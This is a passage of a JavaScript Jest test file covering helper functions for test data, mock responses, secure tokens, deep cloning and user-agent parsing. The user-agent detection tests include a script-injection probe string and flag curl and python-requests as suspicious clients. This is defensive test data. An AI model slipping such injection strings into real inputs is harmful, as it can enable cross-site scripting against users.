      expect(userData).toHaveLength(1);
      expect(userData[0]).toHaveProperty('id');
      expect(userData[0]).toHaveProperty('name');
      expect(userData[0]).toHaveProperty('email');
      expect(typeof userData[0].id).toBe('number');
      expect(typeof userData[0].name).toBe('string');
      expect(validateEmail(userData[0].email)).toBe(true);
    });

    it('should generate multiple test records', () => {
      // Test multiple record generation
      const users = generateTestData('user', { count: 5 });
      
      // Validate multiple records
      expect(users).toHaveLength(5);
      
      // Validate unique IDs
      const ids = users.map(user => user.id);
      const uniqueIds = new Set(ids);
      expect(uniqueIds.size).toBe(5);
      
      // Validate all records have required fields
      users.forEach(user => {
        expect(user).toHaveProperty('id');
        expect(user).toHaveProperty('name');
        expect(user).toHaveProperty('email');
      });
    });

    it('should generate different data types correctly', () => {
      // Test various data type generation
      const productData = generateTestData('product', {
        count: 3,
        fields: ['id', 'name', 'price', 'inStock', 'tags', 'createdAt']
      });
      
      // Validate data type variety
      expect(productData).toHaveLength(3);
      productData.forEach(product => {
        expect(typeof product.id).toBe('number');
        expect(typeof product.name).toBe('string');
        expect(typeof product.price).toBe('number');
        expect(typeof product.inStock).toBe('boolean');
        expect(Array.isArray(product.tags)).toBe(true);
        expect(product.createdAt instanceof Date).toBe(true);
      });
    });
  });

  describe('Advanced Data Generation Features', () => {
    it('should generate realistic related data', () => {
      // Test related data generation
      const orderData = generateTestData('order', {
        count: 2,
        relations: {
          user: 'user',
          items: { type: 'product', count: 3 }
        }
      });
      
      // Validate related data structure
      expect(orderData).toHaveLength(2);
      orderData.forEach(order => {
        expect(order).toHaveProperty('user');
        expect(order).toHaveProperty('items');
        expect(order.user).toHaveProperty('id');
        expect(order.user).toHaveProperty('name');
        expect(Array.isArray(order.items)).toBe(true);
        expect(order.items).toHaveLength(3);
      });
    });

    it('should support custom data generation rules', () => {
      // Test custom generation rules
      const customData = generateTestData('custom', {
        count: 4,
        customFields: {
          userId: () => Math.floor(Math.random() * 1000) + 1000,
          timestamp: () => new Date().toISOString(),
          status: () => ['active', 'inactive', 'pending'][Math.floor(Math.random() * 3)],
          metadata: () => ({ version: '1.0', type: 'test' })
        }
      });
      
      // Validate custom field generation
      expect(customData).toHaveLength(4);
      customData.forEach(item => {
        expect(item.userId).toBeGreaterThanOrEqual(1000);
        expect(item.userId).toBeLessThan(2000);
        expect(typeof item.timestamp).toBe('string');
        expect(['active', 'inactive', 'pending']).toContain(item.status);
        expect(item.metadata).toEqual({ version: '1.0', type: 'test' });
      });
    });

    it('should generate edge case test scenarios', () => {
      // Test edge case data generation
      const edgeCases = generateTestData('edgeCase', {
        scenarios: ['empty', 'null', 'extreme', 'unicode', 'malicious'],
        count: 1
      });
      
      // Validate edge case scenarios
      expect(edgeCases).toHaveLength(5); // One for each scenario
      
      const emptyCase = edgeCases.find(c => c.scenario === 'empty');
      const unicodeCase = edgeCases.find(c => c.scenario === 'unicode');
      const maliciousCase = edgeCases.find(c => c.scenario === 'malicious');
      
      expect(emptyCase.data).toEqual('');
      expect(unicodeCase.data).toMatch(/[\u0080-\uFFFF]/); // Contains Unicode
      expect(maliciousCase.data).toContain('<script>'); // Contains potential XSS
    });
  });

  describe('Performance and Validation Testing', () => {
    it('should generate large datasets efficiently', async () => {
      // Test large dataset generation performance
      const startTime = Date.now();
      
      const largeDataset = generateTestData('performance', {
        count: 1000,
        fields: ['id', 'name', 'email', 'createdAt', 'metadata']
      });
      
      const generationTime = Date.now() - startTime;
      
      // Validate performance and completeness
      expect(largeDataset).toHaveLength(1000);
      expect(generationTime).toBeLessThan(1000); // Should complete within 1 second
      
      // Validate data quality in large dataset
      const sampleItems = largeDataset.slice(0, 10);
      sampleItems.forEach(item => {
        expect(item).toHaveProperty('id');
        expect(item).toHaveProperty('name');
        expect(validateEmail(item.email)).toBe(true);
      });
    });

    it('should maintain data consistency and integrity', () => {
      // Test data consistency
      const consistentData = generateTestData('consistent', {
        count: 10,
        seed: 12345, // Fixed seed for reproducible data
        constraints: {
          minId: 100,
          maxId: 200,
          nameLength: { min: 5, max: 15 },
          emailDomains: ['test.com', 'example.org']
        }
      });
      
      // Validate consistency constraints
      expect(consistentData).toHaveLength(10);
      consistentData.forEach(item => {
        expect(item.id).toBeGreaterThanOrEqual(100);
        expect(item.id).toBeLessThanOrEqual(200);
        expect(item.name.length).toBeGreaterThanOrEqual(5);
        expect(item.name.length).toBeLessThanOrEqual(15);
        expect(['test.com', 'example.org'].some(domain => 
          item.email.includes(domain)
        )).toBe(true);
      });
    });
  });
});

/**
 * Mock Response Creation Helper Function Tests
 * Validates createMockResponse function for HTTP response mocking,
 * testing framework integration, and comprehensive mock scenario handling
 */
describe('createMockResponse Helper Function', () => {
  describe('Basic Mock Response Creation', () => {
    it('should create basic HTTP success mock response', () => {
      // Test basic success response mocking
      const mockResponse = createMockResponse({
        statusCode: 200,
        data: { message: 'Hello world' },
        contentType: 'application/json'
      });
      
      // Validate mock response structure
      expect(mockResponse).toHaveProperty('status', 200);
      expect(mockResponse).toHaveProperty('json');
      expect(mockResponse).toHaveProperty('send');
      expect(mockResponse).toHaveProperty('set');
      expect(mockResponse).toHaveProperty('get');
      
      // Test JSON response functionality
      let jsonData;
      mockResponse.json = jest.fn((data) => { jsonData = data; });
      mockResponse.json({ message: 'Hello world' });
      expect(mockResponse.json).toHaveBeenCalledWith({ message: 'Hello world' });
    });

    it('should create error response mocks', () => {
      // Test error response mocking
      const errorMock = createMockResponse({
        statusCode: 404,
        error: 'Route not found',
        contentType: 'text/plain'
      });
      
      // Validate error response structure
      expect(errorMock.status).toBe(404);
      expect(typeof errorMock.send).toBe('function');
      expect(typeof errorMock.json).toBe('function');
      
      // Test error response functionality
      errorMock.send = jest.fn();
      errorMock.send('Route not found');
      expect(errorMock.send).toHaveBeenCalledWith('Route not found');
    });

    it('should support header manipulation in mocks', () => {
      // Test header manipulation functionality
      const headerMock = createMockResponse({
        statusCode: 200,
        headers: {
          'Content-Type': 'application/json',
          'X-Custom-Header': 'test-value'
        }
      });
      
      // Validate header functionality
      expect(typeof headerMock.set).toBe('function');
      expect(typeof headerMock.get).toBe('function');
      
      // Test header setting and getting
      headerMock.set = jest.fn();
      headerMock.get = jest.fn().mockReturnValue('test-value');
      
      headerMock.set('X-Test', 'value');
      const headerValue = headerMock.get('X-Custom-Header');
      
      expect(headerMock.set).toHaveBeenCalledWith('X-Test', 'value');
      expect(headerValue).toBe('test-value');
    });
  });

  describe('Advanced Mock Functionality', () => {
    it('should support chained method calls', () => {
      // Test method chaining in mock responses
      const chainableMock = createMockResponse({
        statusCode: 201,
        enableChaining: true
      });
      
      // Validate method chaining
      chainableMock.status = jest.fn().mockReturnThis();
      chainableMock.set = jest.fn().mockReturnThis();
      chainableMock.json = jest.fn().mockReturnThis();
      
      const result = chainableMock
        .status(201)
        .set('Location', '/api/users/123')
        .json({ id: 123, created: true });
      
      expect(chainableMock.status).toHaveBeenCalledWith(201);
      expect(chainableMock.set).toHaveBeenCalledWith('Location', '/api/users/123');
      expect(chainableMock.json).toHaveBeenCalledWith({ id: 123, created: true });
      expect(result).toBe(chainableMock);
    });

    it('should simulate response delays and timeouts', async () => {
      // Test response delay simulation
      const delayedMock = createMockResponse({
        statusCode: 200,
        delay: 100,
        data: { message: 'Delayed response' }
      });
      
      // Validate delayed response behavior
      const startTime = Date.now();
      
      await new Promise(resolve => {
        delayedMock.json = jest.fn((data) => {
          const duration = Date.now() - startTime;
          expect(duration).toBeGreaterThanOrEqual(95); // Allow 5ms tolerance
          expect(data).toEqual({ message: 'Delayed response' });
          resolve();
        });
        
        // Simulate delayed execution
        setTimeout(() => {
          delayedMock.json({ message: 'Delayed response' });
        }, 100);
      });
    });

    it('should support conditional response behavior', () => {
      // Test conditional mock responses
      let requestCount = 0;
      
      const conditionalMock = createMockResponse({
        conditional: (req) => {
          requestCount++;
          if (requestCount <= 2) {
            return { statusCode: 200, data: { attempt: requestCount } };
          } else {
            return { statusCode: 429, error: 'Rate limited' };
          }
        }
      });
      
      // Validate conditional behavior
      conditionalMock.json = jest.fn();
      conditionalMock.status = jest.fn().mockReturnThis();
      
      // First request
      const firstResponse = conditionalMock.conditional({});
      expect(firstResponse.statusCode).toBe(200);
      expect(firstResponse.data.attempt).toBe(1);
      
      // Third request (rate limited)
      conditionalMock.conditional({});
      const thirdResponse = conditionalMock.conditional({});
      expect(thirdResponse.statusCode).toBe(429);
      expect(thirdResponse.error).toBe('Rate limited');
    });
  });

  describe('Integration with Testing Frameworks', () => {
    it('should integrate seamlessly with Jest mocking', () => {
      // Test Jest integration
      const jestMock = createMockResponse({
        statusCode: 200,
        framework: 'jest'
      });
      
      // Validate Jest spy integration
      const jsonSpy = jest.spyOn(jestMock, 'json');
      const statusSpy = jest.spyOn(jestMock, 'status');
      const setSpy = jest.spyOn(jestMock, 'set');
      
      jestMock.status(200);
      jestMock.set('Content-Type', 'application/json');
      jestMock.json({ test: 'data' });
      
      expect(statusSpy).toHaveBeenCalledWith(200);
      expect(setSpy).toHaveBeenCalledWith('Content-Type', 'application/json');
      expect(jsonSpy).toHaveBeenCalledWith({ test: 'data' });
    });

    it('should provide comprehensive assertion helpers', () => {
      // Test assertion helper integration
      const assertionMock = createMockResponse({
        statusCode: 200,
        includeAssertions: true
      });
      
      // Validate assertion helpers
      expect(assertionMock).toHaveProperty('assertStatus');
      expect(assertionMock).toHaveProperty('assertHeader');
      expect(assertionMock).toHaveProperty('assertJsonContent');
      
      // Test assertion functionality
      assertionMock.assertStatus = jest.fn((expectedStatus) => {
        expect(assertionMock.status).toBe(expectedStatus);
        return true;
      });
      
      assertionMock.assertHeader = jest.fn((headerName, expectedValue) => {
        return assertionMock.get(headerName) === expectedValue;
      });
      
      const statusValid = assertionMock.assertStatus(200);
      expect(statusValid).toBe(true);
    });

    it('should support mock response validation', () => {
      // Test mock response validation
      const validatedMock = createMockResponse({
        statusCode: 200,
        data: { id: 123, name: 'Test User' },
        validation: {
          schema: {
            type: 'object',
            properties: {
              id: { type: 'number' },
              name: { type: 'string' }
            },
            required: ['id', 'name']
          }
        }
      });
      
      // Validate schema validation integration
      validatedMock.json = jest.fn((data) => {
        const valid = validateTestData(data, validatedMock.validation.schema);
        expect(valid).toBe(true);
      });
      
      validatedMock.json({ id: 123, name: 'Test User' });
      expect(validatedMock.json).toHaveBeenCalled();
    });
  });
});

/**
 * Secure Token Generation Helper Function Tests
 * Validates generateSecureToken function for cryptographic security,
 * token validation, entropy analysis, and secure random value generation
 */
describe('generateSecureToken Helper Function', () => {
  describe('Basic Token Generation', () => {
    it('should generate cryptographically secure tokens', () => {
      // Test basic secure token generation
      const token = generateSecureToken();
      
      // Validate token properties
      expect(typeof token).toBe('string');
      expect(token.length).toBeGreaterThan(0);
      expect(token).toMatch(/^[A-Za-z0-9+/=]+$/); // Base64 pattern
    });

    it('should generate tokens of specified length', () => {
      // Test custom token length
      const lengths = [16, 32, 64, 128];
      
      lengths.forEach(length => {
        const token = generateSecureToken({ bytes: length });
        const expectedBase64Length = Math.ceil(length * 4 / 3);
        
        // Validate length (considering base64 encoding)
        expect(token.length).toBeLessThanOrEqual(expectedBase64Length + 4); // Padding tolerance
      });
    });

    it('should generate unique tokens consistently', () => {
      // Test token uniqueness
      const tokens = new Set();
      const tokenCount = 1000;
      
      for (let i = 0; i < tokenCount; i++) {
        const token = generateSecureToken({ bytes: 32 });
        tokens.add(token);
      }
      
      // Validate uniqueness (should be very high probability)
      expect(tokens.size).toBe(tokenCount);
    });
  });

  describe('Token Format and Encoding', () => {
    it('should support different encoding formats', () => {
      // Test various encoding formats
      const hexToken = generateSecureToken({ bytes: 16, encoding: 'hex' });
      const base64Token = generateSecureToken({ bytes: 16, encoding: 'base64' });
      const base64urlToken = generateSecureToken({ bytes: 16, encoding: 'base64url' });
      
      // Validate encoding formats
      expect(hexToken).toMatch(/^[0-9a-f]+$/i); // Hex pattern
      expect(base64Token).toMatch(/^[A-Za-z0-9+/=]+$/); // Base64 pattern
      expect(base64urlToken).toMatch(/^[A-Za-z0-9_-]+$/); // Base64url pattern
      
      // Validate lengths
      expect(hexToken.length).toBe(32); // 16 bytes * 2 hex chars
      expect(base64urlToken).not.toContain('+');
      expect(base64urlToken).not.toContain('/');
    });

    it('should generate URL-safe tokens', () => {
      // Test URL-safe token generation
      const urlSafeToken = generateSecureToken({
        bytes: 32,
        urlSafe: true
      });
      
      // Validate URL safety
      expect(urlSafeToken).not.toContain('+');
      expect(urlSafeToken).not.toContain('/');
      expect(urlSafeToken).not.toContain('=');
      expect(urlSafeToken).toMatch(/^[A-Za-z0-9_-]+$/);
    });

    it('should support custom character sets', () => {
      // Test custom character set tokens
      const customToken = generateSecureToken({
        bytes: 16,
        charset: '0123456789ABCDEF' // Hex uppercase only
      });
      
      // Validate custom character set
      expect(customToken).toMatch(/^[0-9A-F]+$/);
      expect(customToken.length).toBeGreaterThan(0);
    });
  });

  describe('Cryptographic Security Validation', () => {
    it('should pass entropy analysis tests', async () => {
      // Test cryptographic entropy
      const tokens = [];
      for (let i = 0; i < 100; i++) {
        tokens.push(generateSecureToken({ bytes: 32, encoding: 'hex' }));
      }
      
      // Analyze entropy characteristics
      const entropyAnalysis = await securityTestHelper.analyzeEntropy(tokens);
      
      // Validate entropy quality
      expect(entropyAnalysis.chiSquareTest).toBeGreaterThan(0.01); // Not too uniform
      expect(entropyAnalysis.uniformityScore).toBeGreaterThan(0.8); // Good distribution
      expect(entropyAnalysis.compressionRatio).toBeGreaterThan(0.9); // Low compressibility
    });

    it('should use cryptographically secure random source', () => {
      // Test random source security
      const token1 = generateSecureToken({ bytes: 32 });
      const token2 = generateSecureToken({ bytes: 32 });
      
      // Validate cryptographic randomness
      expect(token1).not.toBe(token2);
      
      // Test against weak patterns
      expect(token1).not.toMatch(/^(.)\1{10,}/); // No long repeated chars
      expect(token1).not.toMatch(/^(..)\1{5,}/); // No short repeated patterns
    });

    it('should handle concurrent token generation safely', async () => {
      // Test concurrent generation security
      const concurrentTokens = await Promise.all(
        Array(100).fill().map(() => 
          Promise.resolve(generateSecureToken({ bytes: 16 }))
        )
      );
      
      // Validate no collisions in concurrent generation
      const uniqueTokens = new Set(concurrentTokens);
      expect(uniqueTokens.size).toBe(100);
      
      // Validate all tokens are properly formatted
      concurrentTokens.forEach(token => {
        expect(typeof token).toBe('string');
        expect(token.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Security Token Use Cases', () => {
    it('should generate session tokens with appropriate properties', () => {
      // Test session token generation
      const sessionToken = generateSecureToken({
        type: 'session',
        bytes: 32,
        urlSafe: true,
        includeTimestamp: true
      });
      
      // Validate session token properties
      expect(typeof sessionToken).toBe('string');
      expect(sessionToken).toMatch(/^[A-Za-z0-9_-]+$/);
      
      if (sessionToken.includes('.')) {
        // If timestamp is included, validate structure
        const parts = sessionToken.split('.');
        expect(parts.length).toBe(2);
      }
    });

    it('should generate API keys with validation capabilities', () => {
      // Test API key generation
      const apiKey = generateSecureToken({
        type: 'apikey',
        bytes: 48,
        prefix: 'ak_',
        includeChecksum: true
      });
      
      // Validate API key structure
      expect(apiKey).toMatch(/^ak_/);
      expect(apiKey.length).toBeGreaterThan(10);
      
      // Validate checksum if included
      if (apiKey.includes('_')) {
        const parts = apiKey.split('_');
        expect(parts.length).toBeGreaterThanOrEqual(2);
      }
    });

    it('should generate CSRF tokens for security protection', () => {
      // Test CSRF token generation
      const csrfToken = generateSecureToken({
        type: 'csrf',
        bytes: 24,
        encoding: 'base64url'
      });
      
      // Validate CSRF token properties
      expect(csrfToken).toMatch(/^[A-Za-z0-9_-]+$/);
      expect(csrfToken.length).toBeGreaterThan(15);
      expect(csrfToken).not.toContain('+');
      expect(csrfToken).not.toContain('/');
    });
  });
});

/**
 * Deep Clone Helper Function Tests
 * Validates deepClone function for object cloning capabilities,
 * circular reference handling, and complex data structure cloning
 */
describe('deepClone Helper Function', () => {
  describe('Basic Object Cloning', () => {
    it('should clone simple objects correctly', () => {
      // Test simple object cloning
      const original = {
        id: 123,
        name: 'Test User',
        active: true,
        score: 95.5
      };
      
      const cloned = deepClone(original);
      
      // Validate cloning correctness
      expect(cloned).toEqual(original);
      expect(cloned).not.toBe(original); // Different reference
      expect(cloned.id).toBe(123);
      expect(cloned.name).toBe('Test User');
      expect(cloned.active).toBe(true);
      expect(cloned.score).toBe(95.5);
    });

    it('should clone nested objects deeply', () => {
      // Test deep nested object cloning
      const original = {
        user: {
          id: 123,
          profile: {
            name: 'John Doe',
            address: {
              street: '123 Main St',
              city: 'Anytown',
              coordinates: {
                lat: 40.7128,
                lng: -74.0060
              }
            }
          }
        },
        metadata: {
          createdAt: new Date('2025-01-01'),
          tags: ['user', 'active']
        }
      };
      
      const cloned = deepClone(original);
      
      // Validate deep cloning
      expect(cloned).toEqual(original);
      expect(cloned.user).not.toBe(original.user);
      expect(cloned.user.profile).not.toBe(original.user.profile);
      expect(cloned.user.profile.address).not.toBe(original.user.profile.address);
      expect(cloned.metadata.tags).not.toBe(original.metadata.tags);
      
      // Test immutability
      cloned.user.profile.name = 'Jane Doe';
      expect(original.user.profile.name).toBe('John Doe');
    });

    it('should clone arrays with nested structures', () => {
      // Test array cloning with nested objects
      const original = [
        { id: 1, values: [1, 2, 3] },
        { id: 2, nested: { data: 'test' } },
        [1, { nested: true }, [4, 5, 6]]
      ];
      
      const cloned = deepClone(original);
      
      // Validate array cloning
      expect(cloned).toEqual(original);
      expect(cloned).not.toBe(original);
      expect(cloned[0]).not.toBe(original[0]);
      expect(cloned[0].values).not.toBe(original[0].values);
      expect(cloned[1].nested).not.toBe(original[1].nested);
      expect(cloned[2]).not.toBe(original[2]);
      
      // Test array immutability
      cloned[0].values.push(4);
      expect(original[0].values).toEqual([1, 2, 3]);
    });
  });

  describe('Special Data Type Handling', () => {
    it('should handle Date objects correctly', () => {
      // Test Date object cloning
      const original = {
        createdAt: new Date('2025-01-01T00:00:00Z'),
        updatedAt: new Date('2025-01-02T12:30:00Z')
      };
      
      const cloned = deepClone(original);
      
      // Validate Date cloning
      expect(cloned.createdAt).toEqual(original.createdAt);
      expect(cloned.createdAt).not.toBe(original.createdAt);
      expect(cloned.createdAt instanceof Date).toBe(true);
      expect(cloned.updatedAt instanceof Date).toBe(true);
      
      // Test Date immutability
      cloned.createdAt.setFullYear(2026);
      expect(original.createdAt.getFullYear()).toBe(2025);
    });

    it('should handle RegExp objects correctly', () => {
      // Test RegExp object cloning
      const original = {
        emailPattern: /^[^\s@]+@[^\s@]+\.[^\s@]+$/i,
        phonePattern: /^\+?[\d\s\-\(\)]+$/
      };
      
      const cloned = deepClone(original);
      
      // Validate RegExp cloning
      expect(cloned.emailPattern).toEqual(original.emailPattern);
      expect(cloned.emailPattern).not.toBe(original.emailPattern);
      expect(cloned.emailPattern instanceof RegExp).toBe(true);
      expect(cloned.emailPattern.test('test@example.com')).toBe(true);
    });

    it('should handle Set and Map objects', () => {
      // Test Set and Map cloning
      const original = {
        uniqueValues: new Set([1, 2, 3, 'test']),
        keyValuePairs: new Map([
          ['key1', 'value1'],
          ['key2', { nested: 'object' }]
        ])
      };
      
      const cloned = deepClone(original);
      
      // Validate Set cloning
      expect(cloned.uniqueValues).not.toBe(original.uniqueValues);
      expect(cloned.uniqueValues instanceof Set).toBe(true);
      expect(cloned.uniqueValues.has('test')).toBe(true);
      expect(cloned.uniqueValues.size).toBe(4);
      
      // Validate Map cloning
      expect(cloned.keyValuePairs).not.toBe(original.keyValuePairs);
      expect(cloned.keyValuePairs instanceof Map).toBe(true);
      expect(cloned.keyValuePairs.get('key1')).toBe('value1');
      expect(cloned.keyValuePairs.get('key2')).not.toBe(original.keyValuePairs.get('key2'));
    });
  });

  describe('Circular Reference Handling', () => {
    it('should handle circular references gracefully', () => {
      // Test circular reference handling
      const original = {
        id: 'root',
        data: 'test'
      };
      original.self = original; // Create circular reference
      original.nested = { parent: original };
      
      const cloned = deepClone(original);
      
      // Validate circular reference handling
      expect(cloned).not.toBe(original);
      expect(cloned.id).toBe('root');
      expect(cloned.data).toBe('test');
      expect(cloned.self).toBe(cloned); // Circular reference preserved
      expect(cloned.nested.parent).toBe(cloned);
      
      // Test immutability with circular references
      cloned.data = 'modified';
      expect(original.data).toBe('test');
    });

    it('should handle complex circular reference chains', () => {
      // Test complex circular reference scenarios
      const objA = { name: 'A' };
      const objB = { name: 'B' };
      const objC = { name: 'C' };
      
      objA.ref = objB;
      objB.ref = objC;
      objC.ref = objA; // Create circular chain
      
      const root = {
        objects: [objA, objB, objC],
        primary: objA
      };
      
      const cloned = deepClone(root);
      
      // Validate complex circular handling
      expect(cloned.objects).not.toBe(root.objects);
      expect(cloned.objects[0]).not.toBe(objA);
      expect(cloned.objects[0].name).toBe('A');
      expect(cloned.objects[0].ref.name).toBe('B');
      expect(cloned.objects[0].ref.ref.name).toBe('C');
      expect(cloned.objects[0].ref.ref.ref).toBe(cloned.objects[0]); // Circular preserved
    });
  });

  describe('Performance and Edge Cases', () => {
    it('should handle null and undefined values', () => {
      // Test null/undefined handling
      const original = {
        nullValue: null,
        undefinedValue: undefined,
        nested: {
          alsoNull: null,
          alsoUndefined: undefined
        }
      };
      
      const cloned = deepClone(original);
      
      // Validate null/undefined preservation
      expect(cloned.nullValue).toBe(null);
      expect(cloned.undefinedValue).toBe(undefined);
      expect(cloned.nested.alsoNull).toBe(null);
      expect(cloned.nested.alsoUndefined).toBe(undefined);
    });

    it('should clone large objects efficiently', async () => {
      // Test performance with large objects
      const largeObject = {
        data: Array(1000).fill().map((_, i) => ({
          id: i,
          value: `item-${i}`,
          nested: {
            properties: Array(10).fill().map((_, j) => ({
              key: `prop-${j}`,
              value: Math.random()
            }))
          }
        }))
      };
      
      const startTime = Date.now();
      const cloned = deepClone(largeObject);
      const cloneTime = Date.now() - startTime;
      
      // Validate performance and correctness
      expect(cloneTime).toBeLessThan(1000); // Should complete within 1 second
      expect(cloned.data).toHaveLength(1000);
      expect(cloned.data[0]).not.toBe(largeObject.data[0]);
      expect(cloned.data[500].nested).not.toBe(largeObject.data[500].nested);
    });

    it('should handle functions and symbols appropriately', () => {
      // Test function and symbol handling
      const testSymbol = Symbol('test');
      const original = {
        normalProp: 'value',
        [testSymbol]: 'symbol value',
        method: function() { return 'method'; },
        arrow: () => 'arrow',
        nested: {
          func: function(x) { return x * 2; }
        }
      };
      
      const cloned = deepClone(original);
      
      // Validate function/symbol handling (implementation dependent)
      expect(cloned.normalProp).toBe('value');
      expect(cloned).not.toBe(original);
      
      // Note: Function and symbol handling varies by implementation
      // This test validates the behavior is consistent and doesn't crash
      expect(typeof cloned).toBe('object');
    });
  });
});

/**
 * User Agent Parsing Helper Function Tests
 * Validates parseUserAgent function for browser detection, security analysis,
 * and comprehensive user agent string parsing capabilities
 */
describe('parseUserAgent Helper Function', () => {
  describe('Browser Detection', () => {
    it('should parse Chrome user agent correctly', () => {
      // Test Chrome user agent parsing
      const chromeUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
      const parsed = parseUserAgent(chromeUA);
      
      // Validate Chrome detection
      expect(parsed.browser.name).toBe('Chrome');
      expect(parsed.browser.version).toMatch(/^120\./);
      expect(parsed.os.name).toBe('Windows');
      expect(parsed.os.version).toBe('10.0');
      expect(parsed.platform).toBe('Windows');
      expect(parsed.isMobile).toBe(false);
    });

    it('should parse Firefox user agent correctly', () => {
      // Test Firefox user agent parsing
      const firefoxUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0';
      const parsed = parseUserAgent(firefoxUA);
      
      // Validate Firefox detection
      expect(parsed.browser.name).toBe('Firefox');
      expect(parsed.browser.version).toMatch(/^121\./);
      expect(parsed.engine.name).toBe('Gecko');
      expect(parsed.os.name).toBe('Windows');
      expect(parsed.isMobile).toBe(false);
    });

    it('should parse Safari user agent correctly', () => {
      // Test Safari user agent parsing
      const safariUA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15';
      const parsed = parseUserAgent(safariUA);
      
      // Validate Safari detection
      expect(parsed.browser.name).toBe('Safari');
      expect(parsed.browser.version).toMatch(/^17\./);
      expect(parsed.os.name).toBe('macOS');
      expect(parsed.os.version).toBe('10.15.7');
      expect(parsed.platform).toBe('Mac');
      expect(parsed.isMobile).toBe(false);
    });
  });

  describe('Mobile Device Detection', () => {
    it('should detect mobile Safari on iOS', () => {
      // Test iOS Safari detection
      const iOSUA = 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1';
      const parsed = parseUserAgent(iOSUA);
      
      // Validate iOS detection
      expect(parsed.browser.name).toBe('Safari');
      expect(parsed.os.name).toBe('iOS');
      expect(parsed.os.version).toBe('17.2');
      expect(parsed.device.type).toBe('mobile');
      expect(parsed.device.model).toBe('iPhone');
      expect(parsed.isMobile).toBe(true);
    });

    it('should detect Android Chrome browser', () => {
      // Test Android Chrome detection
      const androidUA = 'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36';
      const parsed = parseUserAgent(androidUA);
      
      // Validate Android detection
      expect(parsed.browser.name).toBe('Chrome');
      expect(parsed.os.name).toBe('Android');
      expect(parsed.os.version).toBe('14');
      expect(parsed.device.type).toBe('mobile');
      expect(parsed.device.model).toContain('SM-G998B');
      expect(parsed.isMobile).toBe(true);
    });

    it('should detect tablet devices correctly', () => {
      // Test tablet detection
      const iPadUA = 'Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1';
      const parsed = parseUserAgent(iPadUA);
      
      // Validate tablet detection
      expect(parsed.device.type).toBe('tablet');
      expect(parsed.device.model).toBe('iPad');
      expect(parsed.os.name).toBe('iPadOS');
      expect(parsed.isMobile).toBe(true);
      expect(parsed.isTablet).toBe(true);
    });
  });

  describe('Security and Bot Detection', () => {
    it('should detect web crawlers and bots', () => {
      // Test bot detection
      const googleBotUA = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';
      const bingBotUA = 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)';
      
      const googleBot = parseUserAgent(googleBotUA);
      const bingBot = parseUserAgent(bingBotUA);
      
      // Validate bot detection
      expect(googleBot.isBot).toBe(true);
      expect(googleBot.bot.name).toBe('Googlebot');
      expect(googleBot.bot.category).toBe('crawler');
      
      expect(bingBot.isBot).toBe(true);
      expect(bingBot.bot.name).toBe('Bingbot');
      expect(bingBot.bot.category).toBe('crawler');
    });

    it('should detect suspicious or malicious user agents', async () => {
      // Test suspicious user agent detection
      const suspiciousUAs = [
        '', // Empty user agent
        'curl/7.68.0', // Command line tool
        'python-requests/2.31.0', // Automated script
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 HeadlessChrome/99.0.4844.51', // Headless browser
        'Mozilla/5.0 <script>alert("xss")</script>' // XSS attempt
      ];
      
      for (const ua of suspiciousUAs) {
        const parsed = parseUserAgent(ua);
        
        // Validate security analysis
        expect(parsed).toHaveProperty('security');
        
        if (ua === '') {
          expect(parsed.security.suspicious).toBe(true);
          expect(parsed.security.reasons).toContain('empty_user_agent');
        } else if (ua.includes('curl') || ua.includes('python-requests')) {
          expect(parsed.security.suspicious).toBe(true);
          expect(parsed.security.reasons).toContain('automated_tool');
        } else if (ua.includes('HeadlessChrome')) {
          expect(parsed.security.suspicious).toBe(true);
          expect(parsed.security.reasons).toContain('headless_browser');
        } else if (ua.includes('<script>')) {
          expect(parsed.security.suspicious).toBe(true);
          expect(parsed.security.reasons).toContain('malicious_content');
        }
      }
    });

    it('should analyze user agent for fingerprinting resistance', () => {
      // Test fingerprinting analysis
      const standardUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
      const privacyUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Privacy-Enhanced';
      
      const standard = parseUserAgent(standardUA);
      const privacy = parseUserAgent(privacyUA);
      
      // Validate fingerprinting analysis
      expect(standard.fingerprinting).toHaveProperty('uniqueness');
      expect(standard.fingerprinting).toHaveProperty('commonness');
      expect(standard.fingerprinting.uniqueness).toBeLessThan(0.5); // Common UA
      
      if (privacy.browser.name) {
        expect(privacy.fingerprinting).toHaveProperty('privacyFeatures');
        if (privacyUA.includes('Privacy-Enhanced')) {
          expect(privacy.fingerprinting.privacyFeatures).toContain('privacy_enhanced');
        }
      }
    });
  });

  describe('Advanced Parsing Features', () => {
    it('should extract detailed version information', () => {
      // Test detailed version parsing
      const detailedUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36 Edg/120.0.2210.144';
      const parsed = parseUserAgent(detailedUA);
      
      // Validate detailed version information
      expect(parsed.browser.version).toMatch(/^120\.0\.6099\.216/);
      expect(parsed.browser).toHaveProperty('majorVersion', 120);
      expect(parsed.browser).toHaveProperty('minorVersion', 0);
      expect(parsed.browser).toHaveProperty('patchVersion', 6099);
      expect(parsed.browser).toHaveProperty('buildVersion', 216);
    });

    it('should handle legacy and unusual user agents', () => {
